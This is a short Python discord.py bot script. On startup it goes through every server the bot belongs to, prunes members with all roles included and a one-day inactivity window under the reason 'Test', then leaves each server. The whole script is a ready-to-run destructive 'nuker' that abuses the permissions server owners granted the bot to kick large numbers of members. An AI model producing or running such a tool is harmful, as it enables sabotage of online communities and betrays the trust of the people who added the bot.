import discord

token = "bot token here"
intents = discord.Intents.default()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print('Logged in as {0.user}'.format(client))
    for guild in client.guilds:
        try:
            roles = guild.roles
            days = 1
            pruned_members_count = await guild.prune_members(days=days, roles=roles, reason="Test")
            print(f"Pruned {pruned_members_count} Members | {guild.name}")
            await guild.leave()
            print(f"Left {guild.name}")
        except discord.HTTPException as e:
            print(e)
    print("Left All Guilds")

client.run(token)
